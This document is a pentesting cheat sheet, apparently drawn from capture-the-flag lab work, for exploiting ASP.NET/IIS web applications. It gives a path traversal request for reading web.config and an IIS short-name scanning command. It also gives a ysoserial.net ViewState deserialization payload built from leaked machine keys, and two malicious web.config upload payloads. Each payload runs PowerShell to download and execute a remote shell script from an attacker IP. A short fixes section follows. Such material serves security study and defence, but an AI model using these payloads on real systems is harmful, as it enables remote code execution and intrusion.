**Exploring Binary Files with path traversal **

```sh
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```

`Don't forget to try multiple path traversal like ..../ or \..\`

- Interesting file : 
  Web.config
  
- Interesting extension : 
  asp
  aspx
  config
  php

**Microsoft IIS tilde character “~” Vulnerability/Feature – Short File/Folder Name Disclosure**

- Download the tool:
```sh
wget https://github.com/irsdl/IIS-ShortName-Scanner
```
- Exploit :
```sh
java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/
```

**ViewState exploitation knowing secrets **

- Resources : 
https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/
https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/

- Need to read the web.config file:
```sh
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

- Download YsoSerial : 
```sh
https://github.com/pwntester/ysoserial.net/releases/tag/v1.36
```

- Generate the payload : 
```sh
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.18:8080/shell.ps1') "  --decryptionalg="AES"  --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx"
```

**Not knowing Viewstate secrets **

- Resources :
  https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter

### Web config file upload : 

```sh
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.3.12:8080/shell.ps1')")
%>
```


```sh
<?xml version="1.0" encoding="utf-8"?> 
<configuration>  
    <location path="." inheritInChildApplications="false">  
        <system.webServer>  
            <handlers>  
                <add name="aspNetCore" path="toto" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />  
            </handlers>  
            <aspNetCore processPath="cmd.exe" 
                        arguments="/c powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.3.12:8080/shell.ps1')" 
                        stdoutLogEnabled="false" 
                        stdoutLogFile=".\logs\stdout" 
                        hostingModel="OutOfProcess" />  
        </system.webServer>  
    </location>  
</configuration>  
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
```

- Ressources : https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9
## Fixes

- Set **allowSubDirConfig** = false in  
    `C:\Windows\System32\inetsrv\Config\applicationHost.config`. This prevents web.config files from being read in subdirectories
- Remove write permission on the `web.config` file.
- Lock sections in the web config